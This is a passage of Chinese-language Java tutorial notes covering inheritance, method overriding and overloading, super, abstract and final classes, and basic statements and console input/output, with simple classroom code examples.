<h4 id="2-2-属性的继承、隐藏和添加"><a href="#2-2-属性的继承、隐藏和添加" class="headerlink" title="2.2  属性的继承、隐藏和添加"></a><font color="#3CB371" face="Comic sans MS">2.2  属性的继承、隐藏和添加</font></h4><p><strong>注意：属性叫隐藏，方法叫覆盖</strong><br><font face="Comic sans MS"><strong>2.2.1 📒属性的继承：</strong><br>• 子类可以继承父类的所有属性（只要该属性没有private修饰）<br>• 通过属性的继承，子类不需要把父类属性的定义部分重复定义一遍，这样做的好处是减少程序维护的工作量。<br><font color="red">例如：ColorPoint类自动具有Point类的坐标a,b属性</font></font><br>&amp;emsp;<br><font face="Comic sans MS"><strong>2.2.2 📒属性的隐藏：</strong><br>子类重新定义一个与父类那里继承来的成员变量完全相同的变量，就称作属性的隐藏。</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">living</span></span></span><br><span class="line"><span class="class"></span>&#123;   <span class="keyword">public</span> <span class="keyword">int</span> age; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">human</span> <span class="keyword">extends</span> <span class="title">living</span></span></span><br><span class="line"><span class="class"></span>&#123;   <span class="keyword">public</span> <span class="keyword">int</span> age; <span class="comment">//将父类的age隐藏</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></span><br><span class="line"><span class="function">   </span>&#123; human h1=<span class="keyword">new</span> human(); h1.age=<span class="number">20</span>;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><strong>2.2.3 📒属性的添加：</strong></font><br>在定义子类时，加上的新的属性变量，就可以使子类比父类多一些属性</p>
<p><font color="red">例如：ColorPoint类比父类Point多了一个属性，颜色（color）</font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-3-方法的继承、覆盖、重载和添加"><a href="#2-3-方法的继承、覆盖、重载和添加" class="headerlink" title="2.3  方法的继承、覆盖、重载和添加"></a><font color="#3CB371" face="Comic sans MS">2.3  方法的继承、覆盖、重载和添加</font></h4><p><font face="Comic sans MS"><strong>2.3.1 📒方法的继承：</strong><br>父类的非私有方法也可以被子类自动继承。例如类A具有method()方法，那它的子类B不定义该方法也同样拥有method()。</font></p>
<p>&amp;emsp;<br><font face="Comic sans MS"><strong>2.3.2 📒方法的覆盖：</strong></font></p>
<p><font color="red"><strong>方法的覆盖</strong></font>(方法用覆盖这个词修饰，属性用隐藏这个词来修饰)<br>覆盖：在子类中定义的方法和父类中的方法的首部是一样的，包括方法名、参数列表、返回类型和异常抛出。但方法体的实现改变了。<br><img data-src="https://i.loli.net/2018/12/26/5c23095dc4ba6.png" alt="1.png"></p>
<p><font face="Comic sans MS" color="red"><strong>例如:</strong></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">……</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">method</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">……</span><br><span class="line">&#125;</span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span></span>&#123;</span><br><span class="line">……</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">method</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> <span class="keyword">throws</span>  <span class="comment">//覆盖父类的方法method(int x, int y)</span></span></span><br><span class="line"><span class="function">IOException</span>&#123;</span><br><span class="line">……</span><br><span class="line">&#125;</span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS" color="red">覆盖的效果：当一个B类对象调用method方法时它只会使用B类的method版本，而父类A的method版本被覆盖掉了</font><br><font face="Comic sans MS"><strong>在覆盖时要注意以下几点：</strong><br>（1）覆盖的方法的<font color="#00B2EE"><strong>首部</strong></font>必须要和被覆盖的方法的首部完全匹配，才能达到覆盖的效果；<br>（2）覆盖的方法的<font color="#00B2EE"><strong>返回值类型</strong></font>必须和被覆盖的方法的返回值类型一致；<br>（3）覆盖的方法所<font color="#00B2EE"><strong>抛出的异常</strong></font>必须和被覆盖方法的所抛出的异常一致，或者是其子类；<br>（4）被覆盖的方法<font color="#00B2EE"><strong>不能为private</strong></font>，否则在其子类中只是新定义了一个方法，并没有对其进行覆盖</font><br>&amp;emsp;<br><font face="Comic sans MS"><strong>2.3.3 📒方法的重载：</strong><br><font color="red"><strong>含义：方法名相同，但参数列表不同</strong></font><br>通过方法的覆盖，能够修改对象的同名方法的具体实现体，相同的方法在各个子类中实现的版本可以不一样.<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp; —&amp;ensp;—实现多个类中多态性的基础之一<br><font color="red"><strong>重载的效果：</strong></font>父类A的method版本不会被覆盖掉，相当于在子类B中有两个method方法，一个来自父类，一个自己加的，它们之间的参数列表不一样.<br><font color="red"><strong>注意：</strong></font><br>（1）在使用重载时只能通过不同的参数表样式。<br>（2）不能通过访问权限、返回类型、抛出的异常进行重载；(但是同一类里面的成员方法可以这样重载)<br>（3）被重载的方法不能为private，否则在其子类中只是新定义了一个方法，并没有对其进行重载。</p>
<p><font color="red"><strong>特别注意：</strong></font>在继承机制中，不允许在子类中降低成员(包括变量和方法)的访问权限（访问权限大小关系是private &lt; 缺省 &lt; protected &lt; public）。即如果一个方法在父类中是protected的，那么在子类中要重载或覆盖该方法时，就不能把该方法改成是缺省或private，否则会出现编译错误。</font><br>&amp;emsp;<br><font color="green"><em>习题1：分析下列程序输出结果</em> </font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;          <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">PrintNumber</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function">           </span>&#123;          System.out.println(++a);</span><br><span class="line">           &#125;            </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;          <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">PrintNumber</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function">           </span>&#123;          System.out.println(a);</span><br><span class="line">           &#125;  </span><br><span class="line">           <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></span><br><span class="line"><span class="function">         </span>&#123;  </span><br><span class="line">                   B b=<span class="keyword">new</span> B();</span><br><span class="line">                   b.PrintNumber(<span class="number">100</span>);         </span><br><span class="line">          &#125;   </span><br><span class="line">&#125;</span><br><span class="line">输出结果：<span class="number">101</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font color="green"><em>习题2：分析下列程序输出结果</em> </font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;          <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">PrintNumber</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function">           </span>&#123;          System.out.println(++a);</span><br><span class="line">           &#125;            </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;          <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">PrintNumber</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function">           </span>&#123;          System.out.println(--a);</span><br><span class="line">           &#125;  </span><br><span class="line">           <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></span><br><span class="line"><span class="function">         </span>&#123;  </span><br><span class="line">                   B b=<span class="keyword">new</span> B();</span><br><span class="line">                   b.PrintNumber(<span class="number">100</span>);         </span><br><span class="line">          &#125;   </span><br><span class="line">&#125;</span><br><span class="line">输出结果：<span class="number">99</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;<br><font face="Comic sans MS"><strong>2.3.4 📒方法的添加：</strong><br><font color="red"><strong>子类可以新加一些方法，以针对子类实现相应的功能.</strong></font><br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h5 id="2-4-静态成员变量的继承"><a href="#2-4-静态成员变量的继承" class="headerlink" title="2.4  静态成员变量的继承"></a><font color="#3CB371" face="Comic sans MS">2.4  静态成员变量的继承</font></h5><p><font face="Comic sans MS">(1)某类的静态成员为该类及该类的所有子类所共有；<br>(2)如果子类中新定义的静态成员变量与父类中的某个静态成员变量同名，则这两个静态成员变量相互独立。</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">(<span class="number">1</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> b=<span class="number">10</span>; <span class="comment">//静态属性</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> <span class="keyword">extends</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    test.b=<span class="number">20</span>;</span><br><span class="line">    System.out.println(a.b);        </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">输出结果：<span class="number">20</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">(<span class="number">2</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">living</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> age; <span class="comment">//静态属性               </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">human</span> <span class="keyword">extends</span> <span class="title">living</span></span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> age; <span class="comment">//静态属性</span></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">               human.age=<span class="number">20</span>;</span><br><span class="line">               System.out.println(living.age);</span><br><span class="line">        &#125;   </span><br><span class="line">&#125;</span><br><span class="line">输出结果：<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-5-super的使用"><a href="#2-5-super的使用" class="headerlink" title="2.5  super的使用"></a><font color="#3CB371" face="Comic sans MS">2.5  super的使用</font></h4><p><font color="red" face="Comic sans MS">super：代表父类对象，在继承中有重要的作用</font><br><font face="Comic sans MS">📒<strong>使用情况：</strong><br>(1)  子类隐藏了超类中的变量或方法，而在程序中又要使用超类中被隐藏的变量或方法时<br><font color="red">&amp;emsp;&amp;emsp;格式：super.变量 ;  super.方法([参数表])</font><br>(2)  在子类的构造方法中引用超类的构造方法时<br><font color="red">&amp;emsp;&amp;emsp;格式： super([参数表])<br>📒<strong>注意:</strong>  构造方法不能被继承，但是子类的构造方法能确保它的直接父类<br>和间接父类的构造方法都被调用，但是注意一点：<strong>子类构造方法中调用父类构造方法时，调用语句必须放在子类构造方法中的第一句.</strong></font></font><br>&amp;emsp;<br>&amp;emsp;<br><font face="Comic sans MS"><br><strong>1.  📒使用super访问父类的属性和方法</strong><br><img data-src="https://i.loli.net/2018/12/26/5c232ab96c4be.png" alt="1.png"><br>&amp;emsp;<br>&amp;emsp;<br><strong>2.  📒使用super在子类中调用父类的构造方法</strong><br><img data-src="https://i.loli.net/2018/12/26/5c23311cb1dd4.png" alt="2.png"></p>
<p>&amp;emsp;<br><strong>3.  📒使用super的注意事项</strong><br>(1)通过super不仅可以访问直接父类中定义的属性和方法，还可以访问间接父类中定义的属性和方法。<br>(2)由于它指的是父类对象，所以super不能在static环境中使用，包括类变量、类方法和static语句块。<br>(3)使用super不能访问本类定义的属性和方法。<br>(4)在构造方法中使用super时，super语句必须放在第一句<br>(5)在子类的构造方法中，super可以不明确使用，也可以明确使用。<br></font></p>
<p>&amp;emsp;<br><font face="Comic sans MS"><strong>4.  📒明确使用super调用父类构造方法</strong></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x=<span class="number">0</span>;</span><br><span class="line">    Point（<span class="keyword">int</span> x）&#123;</span><br><span class="line">     <span class="keyword">this</span>.x=x;</span><br><span class="line">&#125;</span><br><span class="line">｝</span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MapPoint</span> <span class="keyword">extends</span> <span class="title">Point</span></span>&#123;</span><br><span class="line">MapPoint()&#123;</span><br><span class="line">    <span class="keyword">super</span>(<span class="number">3</span>);  <span class="comment">//明确使用</span></span><br><span class="line">　System.out.println(<span class="string">&quot;MapPoint()&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">　　<span class="keyword">new</span> MapPoint();</span><br><span class="line">　　&#125;</span><br><span class="line"></span><br><span class="line">｝</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;<br><font face="Comic sans MS"><strong>5.  📒不明确使用super调用父类构造方法</strong></font><br><font color="#FF6347">&amp;emsp;<strong>当父类重载自己的构造函数时，在子类的构造函数中要明确写出到底是使用父类的哪一个构造函数！！！否则编译器不知道在子类中到底是调用父类的哪一个构造方法！</strong><br></font></p>
<p><font color="red"><strong>如下:</strong></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x=<span class="number">0</span>;</span><br><span class="line">    Point（<span class="keyword">int</span> x）&#123;</span><br><span class="line">     <span class="keyword">this</span>.x=x;</span><br><span class="line">&#125;</span><br><span class="line">｝</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MapPoint</span> <span class="keyword">extends</span> <span class="title">Point</span></span>&#123;</span><br><span class="line">MapPoint()&#123;</span><br><span class="line">　System.out.println(<span class="string">&quot;MapPoint()&quot;</span>);</span><br><span class="line">　　&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">　　<span class="keyword">new</span> MapPoint();</span><br><span class="line">　　&#125;</span><br><span class="line">｝</span><br><span class="line"><span class="comment">//编译会出错</span></span><br></pre></td></tr></table></figure>

<p><font face="楷体">答案：因为子类中没有明确使用super，系统会自动在构造方法中加上super()，来调用直接父类的不带参数的构造方法，由于Point类中没有定义不带参数的构造方法，所以编译通不过。以上代码相当于：<br></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x=<span class="number">0</span>;</span><br><span class="line">    Point（<span class="keyword">int</span> x）&#123;</span><br><span class="line">     <span class="keyword">this</span>.x=x;</span><br><span class="line">&#125;</span><br><span class="line">｝</span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MapPoint</span> <span class="keyword">extends</span> <span class="title">Point</span></span>&#123;</span><br><span class="line">MapPoint()&#123;</span><br><span class="line">　<span class="keyword">super</span>(); <span class="comment">//此处不能缺省</span></span><br><span class="line">　System.out.println(<span class="string">&quot;MapPoint()&quot;</span>);</span><br><span class="line">　　&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">　　<span class="keyword">new</span> MapPoint();</span><br><span class="line">　　&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&amp;emsp;<br><strong>解决方法：</strong><br>(1)在MapPoint的构造方法中，明确使用super来调用父类已有的构造方法，如super(3);<br>(2)在Point中加入一个不带参数的构造方法，如Point{} 　　　　　<br>(3)去掉Point中全部的构造方法，则编译器会自动加入一个不带参数的构造方法，称为缺省构造方法。</p>
<p>&amp;emsp;<br><strong>6.  📒构造方法的调用顺序</strong><br><font color="red"><strong>一个复杂对象的构造方法调用顺序如下：</strong></font></p>
<p>(1)首先调用父类的构造方法。这个步骤会反复递归，使继承阶层的根源最先被构建，然后是次一层的子类，直至最末一层子类为止；（即先调用最根部的父类，然后依次调用该父类的子类的子类的……..）<br>(2)根据各个成员的声明顺序，执行成员变量的初始化赋值；<br>(3)执行该构造方法中的各语句</p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="三、-抽象类与抽象方法abstract"><a href="#三、-抽象类与抽象方法abstract" class="headerlink" title="三、 抽象类与抽象方法abstract"></a><font color="#FF6347" face="Comic sans MS">三、 抽象类与抽象方法abstract</font></h3><p><font color="red" face="Comic sans MS"><strong>类似于它是一个模板！！！</strong></font></p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">(1)abstract关键字修饰的类和方法
(2)抽象类不能创建任何对象，抽象类必须产生其子类，由子类创建对象。
(3)抽象类中可以包含抽象方法，也可以不包含抽象方法，但如果类中的某一方法是抽象的，整个类就必须被说
    明成抽象的。 
(4)抽象方法在子类中必须被实现，否则子类仍是抽象的。
(5)抽象类不是可有可无的。
(6)(类、成员方法、成员属性)访问权限修饰符为abstract。</font></td></tr></table>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[例<span class="number">4</span>-<span class="number">17</span>]  抽象类举例</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Shape</span> </span></span><br><span class="line"><span class="class"></span>&#123;  <span class="function"><span class="keyword">abstract</span>  <span class="keyword">double</span>  <span class="title">area</span><span class="params">()</span></span>; </span><br><span class="line">    <span class="function"><span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span></span>; &#125;                                         </span><br><span class="line"> <span class="comment">//上述方法对一般图形无法定义其实现</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span>  <span class="keyword">extends</span> <span class="title">Shape</span>  </span>&#123;</span><br><span class="line"><span class="keyword">int</span> width;                        </span><br><span class="line">       <span class="keyword">int</span> length;                       </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">area</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//矩型类实现了Shape类的抽象方法area()</span></span><br><span class="line">   <span class="keyword">return</span> width*length;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">draw</span> <span class="params">()</span> </span>&#123;  … …     </span><br><span class="line"><span class="comment">//矩型类实现了Shape类的抽象方法draw()，详细可由自己完成&#125; </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="四、-final类和final方法"><a href="#四、-final类和final方法" class="headerlink" title="四、 final类和final方法 "></a><font color="#FF6347" face="Comic sans MS">四、 final类和final方法 </font></h3><h4 id="4-1-final类"><a href="#4-1-final类" class="headerlink" title="4.1  final类"></a><font color="#3CB371" face="Comic sans MS">4.1  final类</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">如果一个类被final修饰符所修饰和限定，说明这个类不能被继承，即不可能有子类——最终类
             例如：*java.lang.System*
**📒作用：**
final修饰符通常是出于安全的目的而使用的，因为不能继承final类，人们就不能重载或覆盖它的任何方法。
如果允许一个类被继承，其允许被重载或覆盖的方法可能会被改写。保证某个特定的方法在类层次关系上
的某层以后只有一个定义，这对于那些安全性非常关键的类是非常必要的。</font></td></tr></table>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="4-2-final方法"><a href="#4-2-final方法" class="headerlink" title="4.2  final方法"></a><font color="#3CB371" face="Comic sans MS">4.2  final方法</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">final修饰符所修饰的方法，是不能被子类所覆盖的方法。
📒**作用：**固定了这个方法所对应的具体操作，可以防止子类对父类关键
            方法的错误的重定义，保证了程序的安全性和正确性。
📒**注意：**所有已被private修饰符限定为私有的方法，以及所有包含在final类中的方法，都被默认为是
            final的。
            因为这些方法不可能被子类所继承，所以不可能被重载，自然都是最终的方法。
</font></td></tr></table>

<p>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Java简单语句、复合语句、控制语句(3.7-3.8)</title>
    <url>/post/Java-Language-2-3/</url>
    <content><![CDATA[<p>&amp;ensp;<br>&amp;ensp;</p>
<center><font color="#3CB371" face="Comic sans MS" size=5>简单语句和复合语句 & 控制语句</font></center>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="一、-简单语句和复合语句"><a href="#一、-简单语句和复合语句" class="headerlink" title="一、 简单语句和复合语句 "></a><font color="#FF6347" face="Comic sans MS">一、 简单语句和复合语句 </font></h3><h4 id="1-1-变量定义语句"><a href="#1-1-变量定义语句" class="headerlink" title="1.1  变量定义语句"></a><font color="#3CB371" face="Comic sans MS">1.1  变量定义语句</font></h4><p><font face="Comic sans MS"> 变量定义语句用来定义一个变量，基本格式为：<br>&amp;emsp;&amp;emsp;<font color="red">            类型 变量名1, 变量名2…；</font><br>       例：char c&#x3D;‘a’;  int i,j&#x3D;1;<br></font></p>
<h4 id="1-2-赋值语句"><a href="#1-2-赋值语句" class="headerlink" title="1.2  赋值语句"></a><font color="#3CB371" face="Comic sans MS">1.2  赋值语句</font></h4><p><font face="Comic sans MS">  赋值语句是将表达式的值赋给变量，其格式为：<br>&amp;emsp;&amp;emsp;<font color="red">变量&#x3D;表达式；</font><br>      例： char c;  c&#x3D;‘a’;<br></font></p>
<h4 id="1-3-方法调用语句"><a href="#1-3-方法调用语句" class="headerlink" title="1.3  方法调用语句 "></a><font color="#3CB371" face="Comic sans MS">1.3  方法调用语句 </font></h4><p><font face="Comic sans MS"> 方法调用语句的一般形式为：<br>&amp;emsp;&amp;emsp;<font color="red">对象.方法名( 实参数列表 );</font><br>      例如  System.out.println(“Example!”);<br></font></p>
<h4 id="1-4-空语句"><a href="#1-4-空语句" class="headerlink" title="1.4  空语句 "></a><font color="#3CB371" face="Comic sans MS">1.4  空语句 </font></h4><p><font face="Comic sans MS"> 方法调用语句的一般形式为：<br>&amp;emsp;&amp;emsp;<font color="red">；&#x2F;&#x2F;这是一条空语句</font><br></font></p>
<h4 id="1-5-标准输入输出（I-x2F-O）"><a href="#1-5-标准输入输出（I-x2F-O）" class="headerlink" title="1.5  标准输入输出（I&#x2F;O） "></a><font color="#3CB371" face="Comic sans MS">1.5  标准输入输出（I&#x2F;O） </font></h4><p><font face="Comic sans MS">输入和输出是Java程序的重要组成部分,它提供了人机交互的手段，它们属于方法调用语句。<a href="https://directoree.top/post/Java-IO-1">具体使用方法参考本博客IO使用方法</a>。</p>
<p><font color="#00B2EE"><strong>1. 输入输出</strong></font><br>       输入是指把需要加工的数据放到程序中,read<br>       输出则把程序处理的结果呈现给用户,write<br><font color="#00B2EE"><strong>2. 标准输入输出</strong></font><br>       一般用键盘作为标准的输入设备<br>       显示器则是标准的输出设备<br><strong>通过System.in和System.out对象分别与键盘和显示器发生联系进行输入和输出。</strong><br></font></p>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>📒1. 标准输出System.out对象</strong></font><br><font color="#00B2EE">System.out</font>对象中包含的最常用的方法是：<br><font color="#00B2EE">   print<strong>ln</strong>(参数)</font> 向标准输出设备(显示器)打印一行文本并换行<br><font color="#00B2EE">  print(参数)</font> 向标准输出设备(显示器)打印一行文本但不换行<br>   参数类型：boolean , char char[] ,double ,float ,int ,<br>                  long ,  Object,String </p>
<p>  例如：System.out.println(“Example”);<br>           System.out.print(“Input Name”);<br>           int x&#x3D;2; System.out.print(x);<br></font></p>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>📒2. 标准输入System.in对象</strong></font><br><font color="#00B2EE"><strong>System.in</strong></font>是字节流,作用是从标准输入读一个字节,常用的方法如下:<br><font color="red">   int read()</font>&amp;emsp;           从流中读取一个字节并将该字节作为整数返回,若没有数据则返回-1<br><font color="red">    int read(byte b[])</font>&amp;emsp; 从流中读取多个字节放到b中, 返回实际读取到的字节数<br><font color="red">   int read(byte b[],int off,int len)</font>&amp;emsp; 从流中读取最多len字节的数据, 放到数组b的下标off开始的单元中，返回读取到的字节数<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[例3-1] ReadChar.java 从键盘读一个字符</span><br><span class="line">import java.io.*;</span><br><span class="line">public class ReadChar&#123;</span><br><span class="line">   public static void main(String args[])&#123;</span><br><span class="line">    try&#123;</span><br><span class="line">         char ch=(char)System.in.read(); //将int转换为char</span><br><span class="line">         System.out.println(ch);    </span><br><span class="line">         &#125;catch(IOException e)&#123;&#125;</span><br><span class="line">   &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[例3-2] ReadString.java 从键盘读一串字符</span><br><span class="line">import java.io.*;    </span><br><span class="line">public class ReadString</span><br><span class="line">&#123; public static void main(String args[])</span><br><span class="line">     &#123;  char c;</span><br><span class="line">         try&#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">           &#123;  c=(char)System.in.read();  //使用循环来从输入流中读取一转字符</span><br><span class="line">              System.out.print(c);</span><br><span class="line">            &#125;<span class="keyword">while</span>(c!=<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">         &#125;catch(IOException e)&#123;  &#125;                    </span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[例3-3] ReadStringOrInt.java 从键盘读一数字串或一个整数</span><br><span class="line">import java.io.*;</span><br><span class="line">class ReadStringOrInt&#123;</span><br><span class="line">	public static void main(String args[])&#123;</span><br><span class="line">	      byte buf[]=new byte[20];  </span><br><span class="line">	      String str;</span><br><span class="line">           int anInt;         </span><br><span class="line">	      try&#123;    </span><br><span class="line">               System.in.read(buf);  </span><br><span class="line">	          str=new String(buf)</span><br><span class="line">	          anInt=Integer.parseInt(str.trim()); </span><br><span class="line">	           &#125;</span><br><span class="line">	      catch(Exception e)&#123;  &#125; 	</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line">//要将数字串转换成实数，则： </span><br><span class="line">  <span class="built_in">float</span>  f=Float.parseFloat(str.trim());        //转成单精度数</span><br><span class="line">  double d=Double.parseDouble(str.trim());      //转成双精度数  </span><br></pre></td></tr></table></figure>

<blockquote>
<blockquote>
<p>思考：如何接收用户向程序输入的参数?<br>通过System.in<br>通过main（String[] args）中的形参<br>class test{<br>public static void main(String[] args){<br>   System.out.println(args[0]);<br>   System.out.println(args[1]);<br>}<br>}<br>java test s1 s2<br>s1<br>s2</p>
</blockquote>
</blockquote>
<hr>
<hr>
<p>&amp;emsp;</p>
<h3 id="二、-控制语句句"><a href="#二、-控制语句句" class="headerlink" title="二、 控制语句句 "></a><font color="#FF6347" face="Comic sans MS">二、 控制语句句 </font></h3><ul>
<li>[ ]2.1选择语句<ul>
<li>2.1.1 if-else语句  </li>
<li>2.1.2 switch语句</li>
</ul>
</li>
<li>[ ]2.2循环语句 <ul>
<li>2.2.1 while 语句 </li>
<li>2.2.2 do-while 语句</li>
<li>2.2.3 for 语句</li>
<li>2.2.4 循环的嵌套</li>
</ul>
</li>
<li>[ ]2.3跳转语句  <ul>
<li>2.3.1 break语句</li>
<li>2.3.2 continue语句</li>
<li>2.3.3 return 语句</li>
</ul>
</li>
</ul>
<h4 id="2-1-选择语句"><a href="#2-1-选择语句" class="headerlink" title="2.1  选择语句"></a><font color="#3CB371" face="Comic sans MS">2.1  选择语句</font></h4><h5 id="if-else语句"><a href="#if-else语句" class="headerlink" title="  if-else语句"></a><font color="#00B2EE" face="Comic sans MS">  if-else语句</font></h5><p><font face="Comic sans MS"><font color="red"><strong>📒if-else语句的语法形式：</strong></font><br>       if  (布尔表达式)<br>         {    语句块1   }<br>       [ else<br>          {   语句块2      }  ]<br>     若语句块1，语句块2也是if-else语句便形成嵌套<br></font></p>
